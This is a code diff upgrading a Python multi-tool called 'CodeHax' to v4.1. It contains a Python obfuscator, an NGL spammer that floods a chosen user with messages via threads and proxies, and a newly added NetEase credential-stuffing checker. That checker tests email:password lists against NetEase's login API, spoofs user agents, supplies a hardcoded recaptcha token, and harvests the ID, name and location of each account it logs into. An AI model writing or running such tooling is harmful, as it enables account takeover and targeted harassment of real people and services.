@@ -1,17 +1,20 @@
 #!/usr/bin/env python3
 """
-Enhanced Universal Python Obfuscator / Decoder + NGL Spammer (+ Self-Updater)
-Made by @ItsMeJeff
-v4.0 – Stronger, faster, more resilient
+Enhanced Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker
+Made by @ItsMeJeff & @Antraxdevz
+v4.1
 """
 
 import argparse
 import base64
 import dis
+import hashlib
 import importlib
+import json
 import logging
 import marshal
 import os
+import random
 import re
 import shutil
 import struct
@@ -19,6 +22,7 @@ import subprocess
 import sys
 import tempfile
 import textwrap
+import threading
 import time
 import types
 import zlib
@@ -29,9 +33,9 @@ from typing import Optional, List
 
 import requests
 
-# -----------------------------------------------
+# ----------------------------------------------------------------------
 # Optional rich interface (falls back gracefully)
-# -----------------------------------------------
+# ----------------------------------------------------------------------
 try:
     from rich.console import Console
     from rich.panel import Panel
@@ -46,9 +50,35 @@ except ImportError:
     Confirm = None
     Table = None
 
-# -----------------------------------------------
-# Logging setup
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# Optional colorama (for NetEase checker)
+# ----------------------------------------------------------------------
+try:
+    from colorama import init, Fore, Style
+    init()
+    COLORAMA_AVAILABLE = True
+except ImportError:
+    class DummyFore:
+        RED = ''; GREEN = ''; YELLOW = ''; CYAN = ''; RESET = ''
+    class DummyStyle:
+        RESET_ALL = ''
+    Fore = DummyFore()
+    Style = DummyStyle()
+    def init(): pass
+    COLORAMA_AVAILABLE = False
+
+# ----------------------------------------------------------------------
+# Optional fake_useragent (for NetEase checker)
+# ----------------------------------------------------------------------
+try:
+    from fake_useragent import UserAgent
+    UA_AVAILABLE = True
+except ImportError:
+    UA_AVAILABLE = False
+
+# ----------------------------------------------------------------------
+# Logging
+# ----------------------------------------------------------------------
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -56,65 +86,54 @@ logging.basicConfig(
 )
 log = logging.getLogger("CodeHax")
 
-# -----------------------------------------------
+# ----------------------------------------------------------------------
 # Constants
-# -----------------------------------------------
-VERSION = "4.0"
+# ----------------------------------------------------------------------
+VERSION = "4.1"
 UPDATE_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/main.py"
 NGL_API_URL = "https://ngl.link/api/submit"
 
-# -----------------------------------------------
-# ASCII Art Banner
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# ASCII art for the main menu (only)
+# ----------------------------------------------------------------------
 ASCII_ART = r"""
-  __  __       _ _   _   _______          _ 
- |  \/  |     | | | (_) |__   __|        | |
- | \  / |_   _| | |_ _     | | ___   ___ | |
- | |\/| | | | | | __| |    | |/ _ \ / _ \| |
- | |  | | |_| | | |_| |    | | (_) | (_) | |
- |_|  |_|\__,_|_|\__|_|    |_|\___/ \___/|_|
-                                            
-                                             
+ __    __     __  __     __         ______   __        ______   ______     ______     __        
+/\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       
+\ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  
+ \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ 
+  \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ 
 """
 
-# -----------------------------------------------
-# Rich console helper (fallback to print if missing)
-# -----------------------------------------------
-class ConsoleFallback:
-    """Minimal console equivalent when rich is not installed."""
-    def print(self, *args, **kwargs):
-        print(*args)
-
+# ----------------------------------------------------------------------
+# Console helpers (Rich or fallback)
+# ----------------------------------------------------------------------
 if RICH_AVAILABLE:
     console = Console()
 else:
+    class ConsoleFallback:
+        def print(self, *args, **kwargs):
+            print(*args)
     console = ConsoleFallback()
 
 def rich_prompt(msg: str, default: str = "", choices: list = None) -> str:
-    """Use rich Prompt if available, otherwise input()."""
     if RICH_AVAILABLE and Prompt:
         return Prompt.ask(msg, default=default, choices=choices)
-    else:
-        prompt = f"{msg} " + (f"({default}) " if default else "")
-        resp = input(prompt)
-        return resp if resp else default
+    prompt = f"{msg} " + (f"({default}) " if default else "")
+    resp = input(prompt)
+    return resp if resp else default
 
 def rich_confirm(msg: str, default: bool = True) -> bool:
     if RICH_AVAILABLE and Confirm:
         return Confirm.ask(msg, default=default)
-    else:
-        resp = input(f"{msg} (Y/n) ").strip().lower()
-        if not resp:
-            return default
-        return resp in ("y", "yes")
+    resp = input(f"{msg} (Y/n) ").strip().lower()
+    if not resp:
+        return default
+    return resp in ("y", "yes")
 
-# -----------------------------------------------
-# Decoder utilities
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# Decoding engines
+# ----------------------------------------------------------------------
 def decode_layer_v1(encoded_str: str) -> Optional[str]:
-    """
-    Reverse chain: base64 decode → reverse string → base64 decode → zlib decompress → utf-8.
-    """
     try:
         cleaned = encoded_str.strip().strip("'\"")
         b64_bytes = base64.b64decode(cleaned)
@@ -125,12 +144,8 @@ def decode_layer_v1(encoded_str: str) -> Optional[str]:
         return None
 
 def extract_pyobfuscate_payload(source: str) -> Optional[str]:
-    """
-    Extracts the payload from a PyObfuscate‑style stub:
-    exec((_)(b'...'))
-    """
-    match = re.search(r"exec\(\(_\)\(b'([^']*)'\)\)", source)
-    return match.group(1) if match else None
+    m = re.search(r"exec\(\(_\)\(b'([^']*)'\)\)", source)
+    return m.group(1) if m else None
 
 def try_uncompyle6(code_obj: types.CodeType) -> Optional[str]:
     try:
@@ -141,10 +156,10 @@ def try_uncompyle6(code_obj: types.CodeType) -> Optional[str]:
         try:
             buf = StringIO()
             decompile(ver, code_obj, out=buf)
-            result = buf.getvalue().strip()
-            if result:
+            res = buf.getvalue().strip()
+            if res:
                 log.info(f"Decompiled with uncompyle6 (Python {ver})")
-                return result
+                return res
         except Exception:
             continue
     return None
@@ -158,10 +173,10 @@ def try_decompyle3(code_obj: types.CodeType) -> Optional[str]:
         try:
             buf = StringIO()
             d3decomp(ver, code_obj, out=buf)
-            result = buf.getvalue().strip()
-            if result:
+            res = buf.getvalue().strip()
+            if res:
                 log.info(f"Decompiled with decompyle3 (Python {ver})")
-                return result
+                return res
         except Exception:
             continue
     return None
@@ -208,12 +223,10 @@ def decompile_fallback(code_obj: types.CodeType) -> Optional[str]:
 def decode_pyobfuscate_file(file_path: str) -> Optional[str]:
     with open(file_path, "r", encoding="utf-8") as f:
         content = f.read()
-
     payload = extract_pyobfuscate_payload(content)
     if not payload:
         log.error("No PyObfuscate payload found.")
         return None
-
     reversed_payload = payload[::-1]
     try:
         compressed_data = base64.b64decode(reversed_payload)
@@ -230,11 +243,9 @@ def decode_pyobfuscate_file(file_path: str) -> Optional[str]:
     except Exception as e:
         log.error(f"marshal.loads failed: {e}")
         return None
-
     if not isinstance(code_obj, types.CodeType):
         log.error("Extracted object is not a code object.")
         return None
-
     for decompiler in (try_uncompyle6, try_decompyle3, try_pycdc):
         result = decompiler(code_obj)
         if result:
@@ -245,24 +256,19 @@ def auto_decode(file_path: str) -> Optional[str]:
     if not os.path.isfile(file_path):
         log.error(f"File not found: {file_path}")
         return None
-
     with open(file_path, "r", encoding="utf-8") as f:
         content = f.read()
-
     if extract_pyobfuscate_payload(content):
         log.info("Detected PyObfuscate style.")
         return decode_pyobfuscate_file(file_path)
-
-    match = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', content)
-    if match:
+    m = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', content)
+    if m:
         log.info("Detected Protected Loader v1.0 style.")
-        encoded = match.group(1)
-        decoded = decode_layer_v1(encoded)
+        decoded = decode_layer_v1(m.group(1))
         if decoded is None:
             log.error("Initial layer decoding failed.")
             return None
         while re.search(r'encoded\s*=\s*["\']', decoded):
-            log.info("Unwrapping another layer...")
             inner = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', decoded)
             if inner:
                 decoded = decode_layer_v1(inner.group(1))
@@ -272,7 +278,6 @@ def auto_decode(file_path: str) -> Optional[str]:
             else:
                 break
         return decoded
-
     log.info("No known header detected. Trying raw base64...")
     raw = content.strip().strip("'\"")
     decoded = decode_layer_v1(raw)
@@ -281,9 +286,9 @@ def auto_decode(file_path: str) -> Optional[str]:
     log.error("All decoding attempts failed.")
     return None
 
-# -----------------------------------------------
+# ----------------------------------------------------------------------
 # Obfuscation engines
-# -----------------------------------------------
+# ----------------------------------------------------------------------
 class Obfuscator:
     @staticmethod
     def one_layer_text(code: str) -> str:
@@ -345,17 +350,12 @@ class Obfuscator:
         exec((_)(b'{payload_b64}'))
         """)
 
-    def obfuscate_file(self,
-                       source_path: str,
-                       mode: str = "marshal",
-                       layers: int = 1,
-                       author: str = "@ItsMeJeff") -> str:
+    def obfuscate_file(self, source_path: str, mode: str = "marshal",
+                       layers: int = 1, author: str = "@ItsMeJeff") -> str:
         if not os.path.isfile(source_path):
             raise FileNotFoundError(source_path)
-
         with open(source_path, "r", encoding="utf-8") as f:
             original_code = f.read()
-
         payload = original_code
         for i in range(layers):
             if mode == "marshal":
@@ -363,22 +363,17 @@ class Obfuscator:
             else:
                 payload = self.one_layer_text(payload)
             log.info(f"Applied {mode} layer {i+1}/{layers}")
-
-        if mode == "marshal":
-            final_code = self.generate_marshal_loader(payload, author)
-        else:
-            final_code = self.generate_loader(payload, author)
-
+        final_code = self.generate_marshal_loader(payload, author) if mode == "marshal" \
+                     else self.generate_loader(payload, author)
         out_path = Path(source_path).stem + "_obfuscated.py"
         with open(out_path, "w", encoding="utf-8") as f:
             f.write(final_code)
-
         log.info(f"Obfuscated file saved to {out_path}")
         return out_path
 
-# -----------------------------------------------
-# NGL Spammer with threading and proxy support
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# NGL Spammer
+# ----------------------------------------------------------------------
 class NGLSpammer:
     def __init__(self, username: str, message: str, quantity: int,
                  extra_message: str = None, proxies: List[str] = None,
@@ -391,14 +386,13 @@ class NGLSpammer:
         self.threads = threads
         self.success = 0
         self.failures = 0
-        self.lock = None
+        self.lock = threading.Lock()
 
     def _send_one(self, idx: int):
         session = requests.Session()
         if self.proxies:
             proxy = self.proxies[idx % len(self.proxies)]
             session.proxies = {"http": proxy, "https": proxy}
-
         headers = {
             "authority": "ngl.link",
             "accept": "*/*",
@@ -415,7 +409,6 @@ class NGLSpammer:
             "gameSlug": "",
             "referrer": "",
         }
-
         try:
             resp = session.post(NGL_API_URL, headers=headers, data=payload, timeout=10)
             if resp.status_code == 200:
@@ -430,38 +423,177 @@ class NGLSpammer:
             with self.lock:
                 self.failures += 1
             log.debug(f"✖ Exception #{idx+1}: {e}")
-
         time.sleep(0.2 + (hash(str(idx)) % 4) * 0.1)
 
     def run(self):
-        import threading
-        self.lock = threading.Lock()
-
         log.info(f"Starting NGL spam: {self.quantity} messages to @{self.username}")
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [executor.submit(self._send_one, i) for i in range(self.quantity)]
             for future in as_completed(futures):
                 future.result()
-
         log.info(f"Completed: {self.success} sent, {self.failures} failed.")
 
-# -----------------------------------------------
-# Self-updater with integrity check
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# Netease Account Checker (pure function, no banner)
+# ----------------------------------------------------------------------
+class NeteaseGamesChecker:
+    def __init__(self, threads=10):
+        self.session = requests.Session()
+        self.threads = threads
+        self.success = 0
+        self.failed = 0
+        self.invalid_pass = 0
+        self.errors = 0
+        self.counter_lock = threading.Lock()
+        self.file_lock = threading.Lock()
+
+    def get_md5(self, password):
+        return hashlib.md5(password.encode()).hexdigest()
+
+    def get_random_ua(self):
+        if UA_AVAILABLE:
+            return UserAgent().random
+        fallback_uas = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        ]
+        return random.choice(fallback_uas)
+
+    def save_results(self, result_type, account, extra=""):
+        with self.file_lock:
+            with open(f"{result_type}.txt", "a") as f:
+                f.write(f"{account} {extra}\n")
+
+    def check_account(self, account_data):
+        try:
+            email, password = account_data.split(":", 1)
+            email = email.strip()
+            password = password.strip()
+
+            md5_pwd = self.get_md5(password)
+            random_ua = self.get_random_ua()
+
+            login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
+            login_data = {
+                "account": email,
+                "hash_password": md5_pwd,
+                "client_id": "official",
+                "response_type": "cookie",
+                "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
+                "state": "official_state"
+            }
+            headers = {
+                "Pragma": "no-cache",
+                "Accept": "*/*",
+                "User-Agent": random_ua,
+                "recaptcha-token": "HFaDRze01XOl9xfTpGRh5XR1MpM2ZsE0FzP2wvEUggGWxyPWRlA0JmGW9IWW5TK3EYfXVbDEcAQQFFcC4hdk0SbRE_Pz1bahN9KD9idQMjLBJ7ThUiRT9hQipjbBgXGzNTST91anc_CTFWbT5bSDsSOkd1YW5PM3BvaAUSbTx6eQsqeDZTRVAAHxp6byR7YzQhZQJDdFggGicjaTgyVGI3dChURScMSiteLDdrDEcHGjQUMmg2AykFamVcbBhZZgV8KX94PhkjOQR_WhEoQSEqUmttJkcHGzNTST91anc_CTElMxdUTjhSLDMjPkFGPGpXJFMCbTxwcTIWSHoAHwdXWgZ0bzA7DwQ9ezgzFDlxQzotZDRlAzcwXzxSSScMSixMPi57QFRedgZFYSlhYD4FemVZKEkIQ0crFmhuPAs-LyMsbgk_XH9RSFNkR00LDEcAD25ZLzx-aA"
+            }
+
+            r = self.session.post(login_url, data=login_data, headers=headers, timeout=10)
+            response = r.json()
+
+            with self.file_lock:
+                with open("responses.txt", "a", encoding="utf-8") as f:
+                    f.write(f"\n{email}:{password}\n")
+                    f.write(json.dumps(response, indent=2))
+                    f.write("\n" + "=" * 50 + "\n")
+
+            if response.get("code") == 1006:
+                print(f"{Fore.RED}[INVALID] {email}:{password} - Incorrect password{Style.RESET_ALL}")
+                with self.counter_lock:
+                    self.invalid_pass += 1
+                self.save_results("invalid", f"{email}:{password}", "Invalid password")
+                return
+
+            if "Account does not exist" in r.text:
+                print(f"{Fore.RED}[FAIL] {email}:{password} - Account does not exist{Style.RESET_ALL}")
+                with self.counter_lock:
+                    self.failed += 1
+                self.save_results("failed", f"{email}:{password}", "Account does not exist")
+                return
+
+            if response.get("code") == 0:
+                info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
+                info_headers = {
+                    "User-Agent": random_ua,
+                    "Pragma": "no-cache",
+                    "Accept": "*/*"
+                }
+                r = self.session.get(info_url, headers=info_headers, timeout=10)
+                info = r.json()
+                user_id = info["user"]["user_id"]
+                name = info["user"]["account_name"]
+                location = info["user"]["location"]
+                result = f"""
+{Fore.GREEN}[SUCCESS] {email}:{password}
+User ID: {user_id}
+Name: {name}
+Location: {location}{Style.RESET_ALL}"""
+                print(result)
+                with self.counter_lock:
+                    self.success += 1
+                self.save_results("success", f"{email}:{password}",
+                                  f"ID:{user_id} | Name:{name} | Location:{location}")
+            else:
+                error_msg = response.get("message", "Unknown error")
+                print(f"{Fore.RED}[FAIL] {email}:{password} - {error_msg}{Style.RESET_ALL}")
+                with self.counter_lock:
+                    self.failed += 1
+                self.save_results("failed", f"{email}:{password}", error_msg)
+
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] {email}:{password} - {str(e)}{Style.RESET_ALL}")
+            with self.counter_lock:
+                self.errors += 1
+            self.save_results("errors", f"{email}:{password}", str(e))
+
+    def print_results(self):
+        total = self.success + self.failed + self.invalid_pass + self.errors
+        print(f"""
+{Fore.CYAN}Results Summary:
+Total Checked: {total}
+Success: {Fore.GREEN}{self.success}{Fore.CYAN}
+Failed: {Fore.RED}{self.failed}{Fore.CYAN}
+Invalid Pass: {Fore.YELLOW}{self.invalid_pass}{Fore.CYAN}
+Errors: {Fore.RED}{self.errors}{Fore.CYAN}
+
+Results saved to:
+- success.txt
+- failed.txt
+- invalid.txt
+- errors.txt
+- responses.txt{Style.RESET_ALL}
+""")
+
+    def start(self, filename=None):
+        if not filename:
+            filename = input(f"{Fore.YELLOW}Enter accounts file name: {Style.RESET_ALL}")
+        try:
+            with open(filename) as f:
+                accounts = f.read().splitlines()
+        except FileNotFoundError:
+            print(f"{Fore.RED}[ERROR] File not found!{Style.RESET_ALL}")
+            return
+        print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts{Style.RESET_ALL}\n")
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            executor.map(self.check_account, accounts)
+        self.print_results()
+
+# ----------------------------------------------------------------------
+# Self‑updater
+# ----------------------------------------------------------------------
 def self_update(restart: bool = True):
     log.info("Checking for updates...")
     try:
         response = requests.get(UPDATE_URL, timeout=10)
         response.raise_for_status()
         new_code = response.text
-
         current_path = Path(sys.argv[0])
         current_code = current_path.read_text(encoding="utf-8")
-
         if new_code == current_code:
             log.info("Already up to date.")
             return False
-
         log.info("New version found! Updating...")
         tmp_path = current_path.with_suffix(".py.tmp")
         tmp_path.write_text(new_code, encoding="utf-8")
@@ -471,7 +603,6 @@ def self_update(restart: bool = True):
             log.error(f"Downloaded code contains syntax error: {e}")
             tmp_path.unlink()
             return False
-
         shutil.move(str(tmp_path), str(current_path))
         log.info("Update applied successfully.")
         if restart:
@@ -482,28 +613,27 @@ def self_update(restart: bool = True):
         log.error(f"Update failed: {e}")
         return False
 
-# -----------------------------------------------
-# Interactive menu (used when no arguments given)
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# Interactive menu
+# ----------------------------------------------------------------------
 def interactive_menu():
-    """Fallback interactive menu with ASCII banner."""
     while True:
         if RICH_AVAILABLE:
             console.clear()
-            # Print the ASCII art banner
             console.print(ASCII_ART, style="bold cyan")
             console.print(Panel.fit(
-                "[bold bright_cyan]🛡️ Universal Python Obfuscator / Decoder + NGL Spammer[/bold bright_cyan]\n"
-                f"v{VERSION} – Made by @ItsMeJeff",
+                "[bold bright_cyan]🛡️ Universal Python Obfuscator / Decoder + NGL Spammer + NetEase Checker[/bold bright_cyan]\n"
+                f"v{VERSION} – Made by @ItsMeJeff & @Antraxdevz",
                 border_style="bright_cyan"))
             table = Table(show_header=False, box=None)
             table.add_row("[bold][1][/bold] Decode a file")
             table.add_row("[bold][2][/bold] Obfuscate a file")
             table.add_row("[bold][3][/bold] NGL Spammer")
-            table.add_row("[bold][4][/bold] Check for updates")
-            table.add_row("[bold][5][/bold] Exit")
+            table.add_row("[bold][4][/bold] NetEase Account Checker")
+            table.add_row("[bold][5][/bold] Check for updates")
+            table.add_row("[bold][6][/bold] Exit")
             console.print(table)
-            choice = rich_prompt("Select", choices=["1","2","3","4","5"], default="1")
+            choice = rich_prompt("Select", choices=["1","2","3","4","5","6"], default="1")
         else:
             os.system('cls' if os.name == 'nt' else 'clear')
             print(ASCII_ART)
@@ -511,8 +641,9 @@ def interactive_menu():
                   "[1] Decode\n"
                   "[2] Obfuscate\n"
                   "[3] NGL Spammer\n"
-                  "[4] Update\n"
-                  "[5] Exit")
+                  "[4] NetEase Checker\n"
+                  "[5] Update\n"
+                  "[6] Exit")
             choice = input("Choice: ").strip()
 
         if choice == "1":
@@ -529,6 +660,7 @@ def interactive_menu():
                 print(preview)
             else:
                 log.error("Decoding failed.")
+
         elif choice == "2":
             src = rich_prompt("File to obfuscate")
             mode = rich_prompt("Mode (marshal/text)", choices=["marshal", "text"], default="marshal")
@@ -539,33 +671,38 @@ def interactive_menu():
                 obf.obfuscate_file(src, mode=mode, layers=layers, author=author)
             except Exception as e:
                 log.error(f"Obfuscation failed: {e}")
+
         elif choice == "3":
             username = rich_prompt("Target username")
             message = rich_prompt("Message")
             quantity = int(rich_prompt("Number of messages", default="10"))
             extra = rich_confirm("Add extra message?", default=False)
-            extra_msg = message
-            if extra:
-                extra_msg = rich_prompt("Extra message")
+            extra_msg = rich_prompt("Extra message") if extra else message
             threads = int(rich_prompt("Threads", default="10"))
             proxies_input = rich_prompt("Proxy list (comma separated) or leave empty", default="")
             proxies = [p.strip() for p in proxies_input.split(",") if p.strip()] if proxies_input else []
             spammer = NGLSpammer(username, message, quantity, extra_msg, proxies, threads)
             spammer.run()
+
         elif choice == "4":
-            self_update(restart=True)
+            threads = int(rich_prompt("Threads", default="10"))
+            checker = NeteaseGamesChecker(threads=threads)
+            checker.start()
+
         elif choice == "5":
+            self_update(restart=True)
+
+        elif choice == "6":
             sys.exit(0)
-        else:
-            print("Invalid choice.")
+
         input("\nPress Enter to continue...")
 
-# -----------------------------------------------
-# Command‑line argument parser
-# -----------------------------------------------
+# ----------------------------------------------------------------------
+# CLI
+# ----------------------------------------------------------------------
 def create_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
-        description=f"CodeHax v{VERSION} – Universal Python Obfuscator & Decoder + NGL Spammer",
+        description=f"CodeHax v{VERSION} – Universal Python Obfuscator / Decoder + NGL Spammer + NetEase Checker",
         epilog="If no arguments are given, the interactive menu starts."
     )
     subparsers = parser.add_subparsers(dest="command", help="Operation to perform")
@@ -578,36 +715,35 @@ def create_parser() -> argparse.ArgumentParser:
     # Obfuscate
     encrypt_parser = subparsers.add_parser("obfuscate", help="Obfuscate a Python file")
     encrypt_parser.add_argument("file", help="Path to the source file")
-    encrypt_parser.add_argument("-m", "--mode", choices=["marshal", "text"], default="marshal",
-                                help="Obfuscation style (default: marshal)")
-    encrypt_parser.add_argument("-l", "--layers", type=int, default=1, choices=range(1,11),
-                                help="Number of encoding layers (1-10)")
-    encrypt_parser.add_argument("-a", "--author", default="@ItsMeJeff", help="Author credit in the output")
-    encrypt_parser.add_argument("-o", "--output", help="Output file name (default: <input>_obfuscated.py)")
+    encrypt_parser.add_argument("-m", "--mode", choices=["marshal", "text"], default="marshal")
+    encrypt_parser.add_argument("-l", "--layers", type=int, default=1, choices=range(1,11))
+    encrypt_parser.add_argument("-a", "--author", default="@ItsMeJeff")
+    encrypt_parser.add_argument("-o", "--output")
 
-    # NGL Spam
+    # NGL
     ngl_parser = subparsers.add_parser("ngl", help="NGL spam campaign")
-    ngl_parser.add_argument("username", help="Target NGL username")
-    ngl_parser.add_argument("message", help="Message to send")
-    ngl_parser.add_argument("-q", "--quantity", type=int, default=10, help="Number of requests (default: 10)")
-    ngl_parser.add_argument("-e", "--extra", help="Extra message (default: same as main message)")
-    ngl_parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
-    ngl_parser.add_argument("-p", "--proxies", nargs="*", help="List of proxy URLs (http://...)")
+    ngl_parser.add_argument("username")
+    ngl_parser.add_argument("message")
+    ngl_parser.add_argument("-q", "--quantity", type=int, default=10)
+    ngl_parser.add_argument("-e", "--extra")
+    ngl_parser.add_argument("-t", "--threads", type=int, default=10)
+    ngl_parser.add_argument("-p", "--proxies", nargs="*")
+
+    # NetEase
+    netease_parser = subparsers.add_parser("netease", help="NetEase account checker")
+    netease_parser.add_argument("file", help="File with accounts (email:password)")
+    netease_parser.add_argument("-t", "--threads", type=int, default=10)
 
     # Update
     subparsers.add_parser("update", help="Check for updates and replace current script")
 
     return parser
 
-# -----------------------------------------------
-# Main entry point
-# -----------------------------------------------
 def main():
     parser = create_parser()
     args = parser.parse_args()
 
     if args.command is None:
-        # No command → interactive menu
         interactive_menu()
         return
 
@@ -643,6 +779,10 @@ def main():
             threads=args.threads,
         )
         spammer.run()
+
+    elif args.command == "netease":
+        checker = NeteaseGamesChecker(threads=args.threads)
+        checker.start(filename=args.file)
 
     elif args.command == "update":
         updated = self_update(restart=True)
